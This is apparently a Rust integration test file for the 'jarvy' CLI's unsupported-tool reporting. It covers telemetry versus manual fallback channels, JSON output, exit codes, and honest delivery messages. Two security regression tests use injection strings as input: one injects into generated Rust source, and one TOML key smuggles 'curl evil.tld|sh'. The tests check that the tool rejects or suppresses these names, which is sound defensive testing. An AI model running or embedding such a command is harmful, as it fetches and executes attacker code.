//! Integration tests for the unsupported-tool feedback loop.
//!
//! Covers the canonical-telemetry-channel flow:
//! 1. `jarvy tools --request <name>` always sends via telemetry (bypasses
//!    opt-in) and reports "Reported via telemetry" instead of pushing
//!    the user toward a GitHub account.
//! 2. `--format json` emits a machine-readable payload carrying
//!    `channel: "telemetry"` so AI agents know the request landed.
//! 3. Requesting an *already supported* tool short-circuits.
//! 4. `jarvy setup` against a config of only unsupported tools exits
//!    with `TOOL_UNSUPPORTED` (8). With telemetry off, the fallback
//!    GitHub URL is surfaced as the only remaining channel.

mod common;

use assert_cmd::prelude::*;
use common::{jarvy_cmd, jarvy_fast_cmd};
use predicates::prelude::*;
use std::io::Write;
use tempfile::NamedTempFile;

/// Stable exit code from `src/error_codes.rs`. Hardcoded here so the
/// test fails loudly if the code is ever renumbered — the AI contract
/// depends on this number being constant.
const TOOL_UNSUPPORTED: i32 = 8;

#[test]
fn tools_request_pretty_confirms_telemetry_send_when_enabled() {
    // With telemetry enabled, `--request` actually fires the counter
    // and the renderer says "Reported via telemetry". The fallback
    // URL must NOT appear — that's the whole point of the channel
    // selection logic.
    let mut c = jarvy_cmd();
    c.env("JARVY_TELEMETRY", "1");
    c.args(["tools", "--request", "definitely-not-a-real-tool"]);

    c.assert()
        .success()
        .stdout(predicate::str::contains(
            "tool `definitely-not-a-real-tool` is not in the Jarvy registry",
        ))
        .stdout(predicate::str::contains("Reported via telemetry"))
        .stdout(predicate::str::contains(
            "cargo run -p cargo-jarvy -- new-tool definitely-not-a-real-tool",
        ))
        .stdout(predicate::str::contains("define_tool!"))
        // GitHub URL must not be the primary CTA when telemetry actually
        // handled the request.
        .stdout(predicate::str::contains("github.com").not());
}

#[test]
fn tools_request_pretty_shows_url_when_telemetry_off() {
    // P0 regression guard from the second review: with telemetry off
    // (now explicit via `JARVY_TELEMETRY=0` since the global default
    // flipped to opt-out), `--request` previously claimed "Reported
    // via telemetry" while the counter was silently dropped. The fix
    // uses the counter_fired return value to pick the channel, so
    // this path MUST now show the GitHub fallback URL.
    let mut c = jarvy_cmd();
    c.env("JARVY_TELEMETRY", "0"); // explicit: telemetry off
    c.args(["tools", "--request", "definitely-not-a-real-tool"]);

    c.assert()
        .success()
        // Must NOT lie about delivery.
        .stdout(predicate::str::contains("Reported via telemetry").not())
        // Must surface the fallback channel.
        .stdout(predicate::str::contains("Telemetry off"))
        .stdout(predicate::str::contains("github.com"))
        .stdout(predicate::str::contains("please file a tool request"));
}

#[test]
fn tools_request_json_telemetry_on_reports_telemetry_channel() {
    let mut c = jarvy_cmd();
    c.env("JARVY_TELEMETRY", "1");
    c.args([
        "tools",
        "--request",
        "zzz-fake-tool-name",
        "--format",
        "json",
    ]);

    let assert = c.assert().success();
    let stdout = String::from_utf8_lossy(assert.get_output().stdout.as_ref()).to_string();

    let v: serde_json::Value =
        serde_json::from_str(&stdout).expect("--request --format json must emit valid JSON");

    assert_eq!(v["kind"], "unsupported_tool");
    assert_eq!(v["tool"], "zzz-fake-tool-name");
    assert_eq!(v["exit_code"], TOOL_UNSUPPORTED);
    // Telemetry on → channel reflects actual delivery.
    assert_eq!(v["channel"], "telemetry");
    assert!(
        v["fallback_issue_url"]
            .as_str()
            .unwrap()
            .contains("tool_request.yml"),
        "fallback_issue_url stays populated for users who want a public record"
    );
    assert!(v["snippet"].is_string(), "JSON payload must carry snippet");
    assert!(v["suggestions"].is_array());
}

#[test]
fn tools_request_json_telemetry_off_reports_manual_channel() {
    // P0 regression guard: JSON consumers (AI agents) must see
    // `channel: "manual"` when telemetry was off — that's their signal
    // to fall back to the URL. Previously the path always reported
    // "telemetry" regardless of whether the counter fired. Telemetry
    // off is now explicit via `JARVY_TELEMETRY=0` because the global
    // default flipped to opt-out.
    let mut c = jarvy_cmd();
    c.env("JARVY_TELEMETRY", "0");
    c.args([
        "tools",
        "--request",
        "zzz-fake-tool-name",
        "--format",
        "json",
    ]);

    let assert = c.assert().success();
    let stdout = String::from_utf8_lossy(assert.get_output().stdout.as_ref()).to_string();
    let v: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(
        v["channel"], "manual",
        "telemetry off must surface as channel=manual: {}",
        stdout
    );
}

#[test]
fn tools_request_known_tool_short_circuits() {
    // `git` is a built-in — should refuse to generate a request URL.
    let mut c = jarvy_cmd();
    c.args(["tools", "--request", "git"]);

    c.assert()
        .success()
        .stderr(predicate::str::contains("already supported"));
}

#[test]
fn tools_request_known_custom_install_tool_short_circuits() {
    // `nvm` is registered via the manual-registration path (not via the
    // `define_tool!` macro inventory). The short-circuit must check
    // BOTH the inventory and the registry — testing only `git` left the
    // registry branch uncovered, so a future refactor dropping the
    // `||` right side would silently start emitting request URLs for
    // nvm/rustup/brew.
    let mut c = jarvy_cmd();
    c.args(["tools", "--request", "nvm"]);

    c.assert()
        .success()
        .stderr(predicate::str::contains("already supported"));
}

#[test]
fn tools_request_rejects_malformed_name() {
    // Names that would inject into the scaffolded Rust source must be
    // rejected at the entry point — not sanitized-and-rendered, since
    // the snippet is advertised as paste-into-source.
    let mut c = jarvy_cmd();
    c.args(["tools", "--request", "foo\"); panic!(\"x"]);

    c.assert()
        .failure()
        .stderr(predicate::str::contains("refusing to process tool name"));
}

#[test]
fn tools_request_suggests_close_matches() {
    // `gti` is one transposition away from `git`; fuzzy_suggest should
    // surface it in the JSON suggestions list.
    let mut c = jarvy_cmd();
    c.args(["tools", "--request", "gti", "--format", "json"]);

    let assert = c.assert().success();
    let stdout = String::from_utf8_lossy(assert.get_output().stdout.as_ref()).to_string();
    let v: serde_json::Value = serde_json::from_str(&stdout).unwrap();

    let suggestions: Vec<String> = v["suggestions"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s.as_str().unwrap().to_string())
        .collect();
    assert!(
        suggestions.contains(&"git".to_string()),
        "suggestions should contain `git`, got: {:?}",
        suggestions
    );
}

#[test]
fn setup_with_only_unsupported_tools_exits_8() {
    // Build a jarvy.toml with a single fictional tool. Setup should:
    // - print the structured unsupported-tool message to stderr
    // - exit with TOOL_UNSUPPORTED (8)
    // With telemetry off (explicit `JARVY_TELEMETRY=0` since the
    // global default flipped to opt-out), the fallback GitHub URL is
    // surfaced because telemetry isn't covering the request.
    let mut cfg = NamedTempFile::new().unwrap();
    writeln!(
        cfg,
        r#"
[provisioner]
totally-fake-tool-xyz = "1.0"
"#
    )
    .unwrap();

    // jarvy_fast_cmd() bundles JARVY_TEST_MODE + JARVY_FAST_TEST so we
    // skip actual command execution and don't hit the host's package
    // manager. `JARVY_TELEMETRY=0` keeps telemetry off (default is now
    // opt-out). JARVY_SANDBOX=0 disables sandbox auto-detection so the
    // test runs the same way on Claude Code / containerized CI as on
    // bare metal (otherwise seamless mode flips the renderer into
    // `Sent` and the fallback URL gets suppressed).
    let mut c = jarvy_fast_cmd();
    c.env("JARVY_SANDBOX", "0");
    c.env("JARVY_TELEMETRY", "0");
    c.args(["setup", "--file"])
        .arg(cfg.path())
        .arg("--no-hooks");

    c.assert()
        .code(TOOL_UNSUPPORTED)
        .stderr(predicate::str::contains(
            "tool `totally-fake-tool-xyz` is not in the Jarvy registry",
        ))
        // Telemetry is off in this test — fallback URL is the only
        // channel and must be visible.
        .stderr(predicate::str::contains("Telemetry off"))
        .stderr(predicate::str::contains("template=tool_request.yml"))
        .stderr(predicate::str::contains(
            "cargo run -p cargo-jarvy -- new-tool totally-fake-tool-xyz",
        ));
}

#[test]
fn setup_with_mix_of_known_and_unknown_exits_zero() {
    // The documented contract from src/error_codes.rs: setup returns
    // TOOL_UNSUPPORTED only when EVERY configured tool is unknown.
    // Mixed runs (some known + some unknown) must keep returning 0 so
    // partial setups still succeed. Without this regression guard, a
    // future tightening of the exit condition would break every
    // `jarvy.toml` containing a typo on day one.
    let mut cfg = NamedTempFile::new().unwrap();
    writeln!(
        cfg,
        r#"
[provisioner]
git = "*"
totally-fake-tool-mixed = "1.0"
"#
    )
    .unwrap();

    let mut c = jarvy_fast_cmd();
    c.env("JARVY_SANDBOX", "0");
    c.args(["setup", "--file"])
        .arg(cfg.path())
        .arg("--no-hooks");

    c.assert()
        .code(0)
        .stderr(predicate::str::contains("totally-fake-tool-mixed"));
}

#[test]
fn setup_seamless_no_telemetry_does_not_claim_sent() {
    // Bug guard: previously the channel selection mapped
    // (telemetry-off + seamless) to RequestChannel::Sent, so the
    // renderer printed "Reported via telemetry" while nothing was
    // sent. The fix routes seamless to Manual with the URL visible
    // and the "enable telemetry" hint suppressed.
    let mut cfg = NamedTempFile::new().unwrap();
    writeln!(
        cfg,
        r#"
[provisioner]
seamless-fake-tool = "1.0"
"#
    )
    .unwrap();

    let mut c = jarvy_fast_cmd();
    // Force seamless on, telemetry off — the bug's reproducer.
    // Telemetry must be explicitly disabled here; the global default
    // flipped to opt-out, so simply removing the env var would leave
    // telemetry on.
    c.env("JARVY_SANDBOX", "1");
    c.env("JARVY_TELEMETRY", "0");
    c.args(["setup", "--file"])
        .arg(cfg.path())
        .arg("--no-hooks");

    c.assert()
        .code(TOOL_UNSUPPORTED)
        // Must NOT claim the request was sent — nothing fired.
        .stderr(predicate::str::contains("Reported via telemetry").not())
        // Must show the fallback URL (only remaining channel).
        .stderr(predicate::str::contains("Telemetry off"))
        .stderr(predicate::str::contains("bearbinary/jarvy"))
        // Must NOT push the user toward `jarvy telemetry enable` —
        // seamless operators can't toggle it per-run.
        .stderr(predicate::str::contains("jarvy telemetry enable").not());
}

#[test]
fn setup_seamless_with_telemetry_on_does_not_lie() {
    // QA F8: when seamless + telemetry-on both fire, the renderer
    // should still report "Reporting via telemetry" (truth — the
    // counter fires) and omit the fallback URL. Guards against any
    // future change that re-introduces a seamless dependency into the
    // channel selection.
    let mut cfg = NamedTempFile::new().unwrap();
    writeln!(
        cfg,
        r#"
[provisioner]
seamless-and-telem-on-fake = "1.0"
"#
    )
    .unwrap();

    let mut c = jarvy_fast_cmd();
    c.env("JARVY_SANDBOX", "1");
    c.env("JARVY_TELEMETRY", "1");
    c.args(["setup", "--file"])
        .arg(cfg.path())
        .arg("--no-hooks");

    c.assert()
        .code(TOOL_UNSUPPORTED)
        .stderr(predicate::str::contains("Reporting via telemetry"))
        .stderr(predicate::str::contains("Telemetry off").not())
        .stderr(predicate::str::contains("github.com").not());
}

#[test]
fn setup_with_shell_metachar_tool_name_suppresses_scaffold() {
    // Sec F6 regression guard: a `[provisioner]` key containing shell
    // metacharacters survives sanitization (sanitize_for_display strips
    // only control bytes) and would otherwise render as a copy-paste
    // shell-injection invitation under "Scaffold locally:". The fix
    // gates the scaffold line on validate_tool_name; an invalid name
    // gets a suppression message instead.
    let mut cfg = NamedTempFile::new().unwrap();
    // TOML quoted keys can contain any bytes; embed a fake injection.
    writeln!(cfg, "[provisioner]\n\"foo;curl evil.tld|sh\" = \"1.0\"\n").unwrap();

    let mut c = jarvy_fast_cmd();
    c.env("JARVY_SANDBOX", "0");
    c.args(["setup", "--file"])
        .arg(cfg.path())
        .arg("--no-hooks");

    c.assert()
        .code(TOOL_UNSUPPORTED)
        // Scaffold copy-paste line must NOT appear with the unsafe name.
        .stderr(predicate::str::contains("Scaffold locally:").not())
        // User must be told why.
        .stderr(predicate::str::contains("Scaffold command suppressed"));
}

#[test]
fn setup_with_unsupported_tool_and_telemetry_on_hides_url() {
    // When telemetry is enabled, setup should report via the canonical
    // channel and NOT surface the GitHub URL — the whole point of the
    // channel rework is reducing friction toward filing issues.
    let mut cfg = NamedTempFile::new().unwrap();
    writeln!(
        cfg,
        r#"
[provisioner]
totally-fake-tool-xyz = "1.0"
"#
    )
    .unwrap();

    let mut c = jarvy_fast_cmd();
    c.env("JARVY_SANDBOX", "0");
    // Force telemetry on; endpoint doesn't need to resolve for the
    // human-renderer branch — `is_enabled()` just checks the flag.
    c.env("JARVY_TELEMETRY", "1");
    c.args(["setup", "--file"])
        .arg(cfg.path())
        .arg("--no-hooks");

    c.assert()
        .code(TOOL_UNSUPPORTED)
        .stderr(predicate::str::contains("Reporting via telemetry"))
        .stderr(predicate::str::contains("github.com").not());
}
